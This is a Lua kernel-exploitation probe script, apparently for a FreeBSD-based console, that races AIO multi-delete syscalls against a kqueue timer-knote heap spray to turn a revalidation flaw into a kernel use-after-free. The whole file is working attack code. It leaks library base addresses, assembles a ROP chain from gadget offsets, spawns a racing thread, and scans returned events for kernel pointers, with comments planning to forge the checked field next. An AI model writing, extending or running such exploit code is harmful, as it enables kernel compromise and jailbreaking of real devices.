-- CRASH_CLASS: HIGH
-- PROBE 556a: AIO delete race with kqueue knote spray
--
-- 540c: delete(662) + AIO spray = 64/64 swaps (0x80020010). The revalidation
-- detected different AIO IDs in the reclaimed slots.
--
-- Key question: does the revalidation check an AIO-specific magic/ID, or
-- something that a NON-AIO object could accidentally satisfy?
--
-- This probe: same 540c race model but spray with kqueue knotes instead
-- of AIO submissions. struct knote is ~120 bytes → zone-128, same zone
-- as AIO entries (0x58 bytes → zone-128).
--
-- If delete returns 0x80020010 for all: revalidation catches knotes too
-- (checks AIO-specific field). Next step: figure out which field and forge it.
--
-- If delete returns 0x00 for some: revalidation PASSED on a knote →
-- kernel freed knote sub-objects thinking they were AIO sub-objects → UAF!
--
-- If process crashes: we corrupted kernel structures. Interesting either way.

print("=== PROBE 556a: KNOTE SPRAY RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc240 = mk(240)
local sc362 = mk(362)   -- kqueue
local sc363 = mk(363)   -- kevent
local sc455 = mk(455)   -- thr_new
local sc477 = mk(477)   -- mmap
local sc662 = mk(662)   -- aio_multi_delete
local sc664 = mk(664)   -- aio_multi_poll
local sc669 = mk(669)   -- aio_submit
local sc670 = mk(670)   -- aio_init

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

-- AIO init
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

-- Open /dev/urandom
local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_u, urand_fd = pcall(function()
    return mk(5)(uint64(N(urand_path)), Z, Z)
end)
urand_fd = ok_u and N(urand_fd) or -1
print("urandom=" .. urand_fd)

-- Kqueue
local ok_kq, kq_fd_raw = pcall(function() return sc362() end)
local kq_fd = ok_kq and N(kq_fd_raw) or -1
print("kqueue=" .. kq_fd)

if kq_fd < 0 then
    print("KQUEUE FAILED — abort")
    return
end

-- Shared memory for child thread communication
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x2000)
local sn = N(shared)
print("shared=" .. q(shared))

-- Layout in shared:
-- +0x000: child_done (dword)
-- +0x010: delete_statuses[64] (dwords) — one per entry
-- +0x410: ids[64] (dwords)

local NUM = 64
local NOP_PAD = 8

-- ============================================================
-- Helper: submit one AIO read on urandom
-- ============================================================
local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit_one()
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(N(db)))
    wq(reqs_buf + 0x18, uint64(N(rb)))
    wd(reqs_buf + 0x20, urand_fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(N(reqs_buf)), uint64(1), uint64(1), uint64(N(ids_out)))
    end)
    return (ok and N(rv) or -999), (rd(ids_out) or 0)
end

local function aio_poll_one(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    pcall(function() sc664(uint64(N(ip)), uint64(1), uint64(N(sp))) end)
    return rd(sp) or 0
end

local function aio_delete_one(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    pcall(function() sc662(uint64(N(ip)), uint64(1), uint64(N(sp))) end)
    return rd(sp) or 0
end

-- ============================================================
-- Helper: make TCB
-- ============================================================
local function make_tcb()
    local ok_t, p = pcall(function()
        return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- ============================================================
-- Build deleter ROP chain (same as 540c)
-- ============================================================
local function build_deleter(count)
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc477(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = N(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local wp = mid - 8
    local off = 0
    local function emit(v) wq(uint64(wp + off), v); off = off + 8 end

    -- sysarch(SET_FSBASE=129)
    emit(pop_rax); emit(uint64(165))
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(tcb)
    emit(fn_addr)

    -- 20 getpid NOPs to let main thread start spraying
    for pad = 1, 20 do
        emit(pop_rax); emit(uint64(20))
        emit(pop_rdi); emit(Z)
        emit(fn_addr)
    end

    -- Delete one-by-one with NOP padding
    for i = 0, count - 1 do
        local id_addr = uint64(sn + 0x410 + i * 4)
        local st_addr = uint64(sn + 0x010 + i * 4)

        emit(pop_rax); emit(uint64(662))
        emit(pop_rdi); emit(id_addr)
        emit(pop_rsi); emit(uint64(1))
        emit(pop_rdx); emit(st_addr)
        emit(fn_addr)

        for p = 1, NOP_PAD do
            emit(pop_rax); emit(uint64(20))
            emit(pop_rdi); emit(Z)
            emit(fn_addr)
        end
    end

    -- Write done marker
    emit(pop_rax); emit(uint64(0xD00E))
    emit(pop_rdi); emit(uint64(sn))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rax); emit(uint64(431))
    emit(pop_rdi); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp, off
end

-- ============================================================
-- [A] Submit AIO entries on urandom (complete fast)
-- ============================================================
print("")
print("[A] submit " .. NUM .. " AIO reads on urandom")

local orig_ids = {}
local ok_count = 0
for i = 1, NUM do
    local rv, id = aio_submit_one()
    if rv == 0 and id > 0 then
        ok_count = ok_count + 1
        orig_ids[ok_count] = id
    end
end
print("  created=" .. ok_count)

-- Brief pause for completion
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
pcall(function() sc240(uint64(N(ts)), Z) end)

-- Verify completed
local completed = 0
for i = 1, ok_count do
    local st = aio_poll_one(orig_ids[i])
    if st == 3 or st == 0x10003 then completed = completed + 1 end
end
print("  completed=" .. completed .. "/" .. ok_count)

-- Write IDs to shared memory
for i = 1, ok_count do
    wd(sn + 0x410 + (i-1) * 4, orig_ids[i])
    wd(sn + 0x010 + (i-1) * 4, 0x77777777)
end
wd(sn, 0)  -- child_done = 0

-- ============================================================
-- [B] Race: child=delete(662), main=kqueue knote spray
-- ============================================================
print("")
print("[B] Race: child delete, main kqueue spray")

local tp, csz = build_deleter(ok_count)
print("  chain=" .. csz .. "B")

-- Launch child
pcall(function() sc455(uint64(N(tp)), uint64(0x38)) end)

-- Spray: register EVFILT_TIMER events as fast as possible
-- Each registration allocates a struct knote (~120B) in zone-128
local changelist = memory.alloc(0x40)
local SPRAY_COUNT = 512
local spray_ok = 0
local spray_fail = 0

for i = 1, SPRAY_COUNT do
    wq(changelist, uint64(i))                   -- ident = timer id
    wd(changelist + 8, 0x0001FFF9)              -- filter=-7 (TIMER), flags=EV_ADD
    wd(changelist + 12, 0)                       -- fflags
    wq(changelist + 16, uint64(999999))          -- data = 999999ms (won't fire)
    wq(changelist + 24, uint64(0xCAFE0000 + i))  -- udata marker

    local ok_r, rv_r = pcall(function()
        return sc363(uint64(kq_fd), uint64(N(changelist)), uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    if ok_r and N(rv_r) >= 0 then
        spray_ok = spray_ok + 1
    else
        spray_fail = spray_fail + 1
    end
end
print("  kqueue spray: ok=" .. spray_ok .. " fail=" .. spray_fail)

-- Wait for child to finish
wq(ts, uint64(2)); wq(ts + 8, Z)
for w = 1, 15 do
    if (rd(sn) or 0) ~= 0 then break end
    pcall(function() sc240(uint64(N(ts)), Z) end)
end
local child_done = rd(sn) or 0
print("  child_done=0x" .. string.format("%X", child_done))

-- ============================================================
-- [C] Analyze delete results
-- ============================================================
print("")
print("[C] Delete results")

local status_counts = {}
for i = 0, ok_count - 1 do
    local st = rd(sn + 0x010 + i * 4) or 0
    local key = string.format("0x%08X", st)
    status_counts[key] = (status_counts[key] or 0) + 1
end

for k, v in pairs(status_counts) do
    print(string.format("  %s x%d", k, v))
end

local swap_count = status_counts["0x80020010"] or 0
local clean_count = status_counts["0x00000000"] or 0
local gone_count = status_counts["0x80020003"] or 0

print(string.format("  summary: clean=%d swap=%d gone=%d", clean_count, swap_count, gone_count))

if clean_count > 0 and swap_count > 0 then
    print("  *** MIXED RESULTS: some deletes passed revalidation on knotes! ***")
    print("  first 8 statuses:")
    for i = 0, 7 do
        if i < ok_count then
            print(string.format("    [%d] id=0x%X st=0x%08X",
                i, rd(sn + 0x410 + i * 4) or 0, rd(sn + 0x010 + i * 4) or 0))
        end
    end
end

-- ============================================================
-- [D] Kqueue health check — retrieve events
-- ============================================================
print("")
print("[D] Kqueue health")

local eventlist = memory.alloc(0x2000)
local timeout_buf = memory.alloc(16)
wq(timeout_buf, Z); wq(timeout_buf + 8, Z)

local ok_ev, nev_raw = pcall(function()
    return sc363(uint64(kq_fd), uint64(0), uint64(0),
        uint64(N(eventlist)), uint64(32), uint64(N(timeout_buf)))
end)
local nev = ok_ev and N(nev_raw) or -999
print("  events retrieved=" .. nev)

if nev > 0 then
    local kptr_count = 0
    local anomalies = 0
    for ei = 0, math.min(nev, 31) - 1 do
        local bo = ei * 32
        local id_lo = rd(eventlist + bo) or 0
        local id_hi = rd(eventlist + bo + 4) or 0
        local fl = rd(eventlist + bo + 8) or 0
        local ud_lo = rd(eventlist + bo + 24) or 0
        local ud_hi = rd(eventlist + bo + 28) or 0

        -- Check for kernel pointers in event data
        local function check_kptr(name, hi, lo)
            local uhi = hi
            if uhi < 0 then uhi = uhi + 0x100000000 end
            if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 5 then
                    print(string.format("  *** KPTR: ev[%d] %s=0x%08X%08X ***",
                        ei, name, hi, lo))
                end
            end
        end
        check_kptr("ident", id_hi, id_lo)
        check_kptr("udata", ud_hi, ud_lo)

        -- Check for corrupted ident (should be 1..SPRAY_COUNT)
        if id_hi ~= 0 or id_lo < 1 or id_lo > SPRAY_COUNT then
            anomalies = anomalies + 1
            if anomalies <= 5 then
                print(string.format("  ANOMALY: ev[%d] ident=0x%08X%08X flags=0x%08X",
                    ei, id_hi, id_lo, fl))
            end
        end

        -- Check udata marker
        if ud_hi ~= 0 then
            anomalies = anomalies + 1
            if anomalies <= 5 then
                print(string.format("  ANOMALY: ev[%d] udata=0x%08X%08X (expected 0xCAFE00xx)",
                    ei, ud_hi, ud_lo))
            end
        end
    end
    print(string.format("  kptrs=%d anomalies=%d", kptr_count, anomalies))
end

-- ============================================================
-- [E] Original AIO IDs — zombies or gone?
-- ============================================================
print("")
print("[E] Original IDs post-race")

local alive_count = 0
local gone_post = 0
local weird_post = 0
for i = 1, ok_count do
    local st = aio_poll_one(orig_ids[i])
    if st == 3 or st == 0x10003 then
        alive_count = alive_count + 1
    elseif st == 0x80020003 then
        gone_post = gone_post + 1
    else
        weird_post = weird_post + 1
        if weird_post <= 3 then
            print(string.format("  WEIRD: id=0x%X poll=0x%X", orig_ids[i], st))
        end
    end
end
print(string.format("  alive=%d gone=%d weird=%d", alive_count, gone_post, weird_post))

if alive_count > 0 then
    print("  zombies detected — same as 540c with AIO spray")
end

-- ============================================================
-- [F] AIO subsystem health
-- ============================================================
print("")
print("[F] AIO health check")

local h_rv, h_id = aio_submit_one()
if h_rv == 0 and h_id > 0 then
    wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
    pcall(function() sc240(uint64(N(ts)), Z) end)
    local h_st = aio_poll_one(h_id)
    local h_del = aio_delete_one(h_id)
    local h_del2 = aio_delete_one(h_id)
    print(string.format("  create=0x%X poll=0x%X del=0x%X del2=0x%X",
        h_id, h_st, h_del, h_del2))
    if h_st == 3 and h_del == 0 and h_del2 == 0x80020003 then
        print("  HEALTHY")
    else
        print("  *** UNHEALTHY ***")
    end
else
    print("  CREATE FAILED rv=" .. h_rv)
end

-- ============================================================
-- [G] Cleanup kqueue events
-- ============================================================
print("")
print("[G] Cleanup")

local del_ok = 0
for i = 1, spray_ok do
    wq(changelist, uint64(i))
    wd(changelist + 8, 0x0002FFF9)  -- EVFILT_TIMER, flags=EV_DELETE
    wd(changelist + 12, 0)
    wq(changelist + 16, Z)
    wq(changelist + 24, Z)
    local ok_d = pcall(function()
        sc363(uint64(kq_fd), uint64(N(changelist)), uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    if ok_d then del_ok = del_ok + 1 end
end
pcall(function() sc6(uint64(kq_fd)) end)
print("  deleted " .. del_ok .. "/" .. spray_ok .. " timer events")

-- Cleanup original AIO zombies
for i = 1, ok_count do
    pcall(function() aio_delete_one(orig_ids[i]) end)
end

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 556a DONE ===")
